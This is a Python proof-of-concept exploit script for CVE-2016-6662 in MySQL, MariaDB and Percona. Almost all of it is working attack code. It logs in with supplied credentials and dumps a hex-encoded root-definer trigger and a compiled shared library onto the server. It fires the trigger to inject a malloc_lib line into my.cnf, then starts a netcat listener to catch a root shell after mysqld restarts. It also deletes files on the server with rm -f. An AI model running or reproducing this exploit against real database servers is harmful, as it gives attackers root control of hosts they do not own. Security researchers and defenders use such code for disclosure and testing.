#!/usr/bin/python

#
# MySQL / MariaDB / Percona -  Remote Root Code Execution / PrivEsc PoC Exploit
# (CVE-2016-6662)
# 0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)
#
# For testing purposes only. Do no harm.
#
# Discovered/Coded by:
#
# Dawid Golunski
# http://legalhackers.com
#
#
# This is a limited version of the PoC exploit. It only allows appending to
# existing mysql config files with weak permissions. See V) 1) section of
# the advisory for details on this vector.
#
# Full PoC will be released at a later date, and will show how attackers could
# exploit the vulnerability on default installations of MySQL on systems with no
# writable my.cnf config files available.
#
# The upcoming advisory CVE-2016-6663 will also make the exploitation trivial
# for certain low-privileged attackers that do not have FILE privilege.
#
# See full advisory for details:
# https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html
#
# Video PoC:
# https://legalhackers.com/videos/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html
#
#
# Follow: https://twitter.com/dawid_golunski
# &
# Stay tuned ;)
#

intro = """
0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)
(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit

For testing purposes only. Do no harm.

Discovered/Coded by:

Dawid Golunski
http://legalhackers.com

"""

import argparse
import mysql.connector
import binascii
import subprocess


def info(str):
    print "[+] " + str + "\n"

def errmsg(str):
    print "[!] " + str + "\n"

def shutdown(code):
    if (code==0):
        info("Exiting (code: %d)\n" % code)
    else:
        errmsg("Exiting (code: %d)\n" % code)
    exit(code)


cmd = "rm -f /var/lib/mysql/pocdb/poctable.TRG ; rm -f /var/lib/mysql/mysql_hookandroot_lib.so"
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
(result, error) = process.communicate()
rc = process.wait()


# where will the library to be preloaded reside? /tmp might get emptied on reboot
# /var/lib/mysql is safer option (and mysql can definitely write in there ;)
malloc_lib_path='/var/lib/mysql/mysql_hookandroot_lib.so'


# Main Meat

print intro

# Parse input args
parser = argparse.ArgumentParser(prog='0ldSQL_MySQL_RCE_exploit.py', description='PoC for MySQL Remote Root Code Execution / Privesc CVE-2016-6662')
parser.add_argument('-dbuser', dest='TARGET_USER', required=True, help='MySQL username')
parser.add_argument('-dbpass', dest='TARGET_PASS', required=True, help='MySQL password')
parser.add_argument('-dbname', dest='TARGET_DB',   required=True, help='Remote MySQL database name')
parser.add_argument('-dbhost', dest='TARGET_HOST', required=True, help='Remote MySQL host')
parser.add_argument('-mycnf', dest='TARGET_MYCNF', required=True, help='Remote my.cnf owned by mysql user')

args = parser.parse_args()


# Connect to database. Provide a user with CREATE TABLE, SELECT and FILE permissions
# CREATE requirement could be bypassed (malicious trigger could be attached to existing tables)
info("Connecting to target server %s and target mysql account '%s@%s' using DB '%s'" % (args.TARGET_HOST, args.TARGET_USER, args.TARGET_HOST, args.TARGET_DB))
try:
    dbconn = mysql.connector.connect(user=args.TARGET_USER, password=args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST)
except mysql.connector.Error as err:
    errmsg("Failed to connect to the target: {}".format(err))
    shutdown(1)

try:
    cursor = dbconn.cursor()
    cursor.execute("SHOW GRANTS")
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(2)

privs = cursor.fetchall()
info("The account in use has the following grants/perms: " )
for priv in privs:
    print priv[0]
print ""


# Compile mysql_hookandroot_lib.so shared library that will eventually hook to the mysqld
# process execution and run our code (Remote Root Shell)
# Remember to match the architecture of the target (not your machine!) otherwise the library
# will not load properly on the target.
info("Compiling mysql_hookandroot_lib.so")
cmd = "gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
(result, error) = process.communicate()
rc = process.wait()
if rc != 0:
    errmsg("Failed to compile mysql_hookandroot_lib.so: %s" % cmd)
    print error
    shutdown(2)

# Load mysql_hookandroot_lib.so library and encode it into HEX
info("Converting mysql_hookandroot_lib.so into HEX")
hookandrootlib_path = './mysql_hookandroot_lib.so'
with open(hookandrootlib_path, 'rb') as f:
    content = f.read()
    hookandrootlib_hex = binascii.hexlify(content)

# Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG
# in spite of the lack of SUPER/admin privileges (attacker only needs SELECT/FILE privileges).
# Decoded payload (paths may differ) will look similar to:
"""
DELIMITER //
CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `poctable` FOR EACH ROW
BEGIN

   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select "

# 0ldSQL_MySQL_RCE_exploit got here :)

[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'

[abyss]
" INTO void;
   set global general_log = off;

END; //
DELIMITER ;
"""
trigger_payload="""TYPE=TRIGGERS
triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'
sql_modes=0
definers='root@localhost'
client_cs_names='utf8'
connection_cl_names='utf8_general_ci'
db_cl_names='latin1_swedish_ci'
""" % (args.TARGET_MYCNF, malloc_lib_path)

# Convert trigger into HEX to pass it to unhex() SQL function
trigger_payload_hex = "".join("{:02x}".format(ord(c)) for c in trigger_payload)

# Save trigger into a trigger file
TRG_path="/var/lib/mysql/%s/poctable.TRG" % args.TARGET_DB
info("Saving trigger payload into %s" % (TRG_path))
try:
    cursor = dbconn.cursor()
    cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (trigger_payload_hex, TRG_path) )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(4)

# Save library into a trigger file
info("Dumping shared library into %s file on the target" % malloc_lib_path)
try:
    cursor = dbconn.cursor()
    cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (hookandrootlib_hex, malloc_lib_path) )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(5)

# Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server
info("Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded")
try:
    cursor = dbconn.cursor()
    cursor.execute("CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"  )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(6)

# Finally, execute the trigger's payload by inserting anything into `poctable`.
# The payload will write to the mysql config file at this point.
info("Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s" % args.TARGET_MYCNF )
try:
    cursor = dbconn.cursor()
    cursor.execute("INSERT INTO `poctable` VALUES('execute the trigger!');" )
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(6)

# Check on the config that was just created
info("Showing the contents of %s config to verify that our setting (malloc_lib) got injected" % args.TARGET_MYCNF )
try:
    cursor = dbconn.cursor()
    cursor.execute("SELECT load_file('%s')" % args.TARGET_MYCNF)
except mysql.connector.Error as err:
    errmsg("Something went wrong: {}".format(err))
    shutdown(2)
finally:
    dbconn.close()  # Close DB connection
print ""
myconfig = cursor.fetchall()
print myconfig[0][0]
info("Looks messy? Have no fear, the preloaded lib mysql_hookandroot_lib.so will clean up all the mess before mysqld daemon even reads it :)")

# Spawn a Shell listener using netcat on 6033 (inverted 3306 mysql port so easy to remember ;)
info("Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)" )
listener = subprocess.Popen(args=["/bin/nc", "-lvp","6033"])
listener.communicate()
print ""

# Show config again after all the action is done
info("Shell closed. Hope you had fun. ")

# Mission complete, but just for now... Stay tuned :)
info("""Stay tuned for the CVE-2016-6663 advisory and/or a complete PoC that can craft a new valid my.cnf (i.e no writable my.cnf required) ;)""")


# Shutdown
shutdown(0)